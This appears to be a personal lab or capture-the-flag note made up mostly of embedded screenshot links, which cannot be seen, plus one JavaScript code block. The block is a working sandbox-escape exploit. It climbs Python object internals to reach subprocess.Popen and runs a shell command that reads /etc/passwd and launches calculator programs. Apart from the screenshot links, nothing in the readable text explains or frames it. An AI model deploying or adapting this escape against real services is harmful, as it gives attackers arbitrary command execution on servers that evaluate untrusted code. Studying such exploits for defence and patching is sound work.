![[Pasted image 20260202105830.png]]


![[Pasted image 20260202105905.png]]


![[Pasted image 20260202105922.png]]


![[Pasted image 20260202105944.png]]


![[Pasted image 20260202110026.png]]


![[Pasted image 20260202110109.png]]


![[Pasted image 20260202110545.png]]


![[Pasted image 20260202110929.png]]


```
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```


![[Pasted image 20260202111645.png]]

![[Pasted image 20260202111700.png]]


![[Pasted image 20260202111617.png]]


![[Pasted image 20260202112131.png]]


![[Pasted image 20260202112249.png]]


![[Pasted image 20260202112354.png]]


![[Pasted image 20260202113659.png]]


![[Pasted image 20260202114409.png]]


![[Pasted image 20260202225015.png]]

![[Pasted image 20260202225049.png]]


![[Pasted image 20260202225110.png]]


![[Pasted image 20260202224847.png]]


![[Pasted image 20260202224942.png]]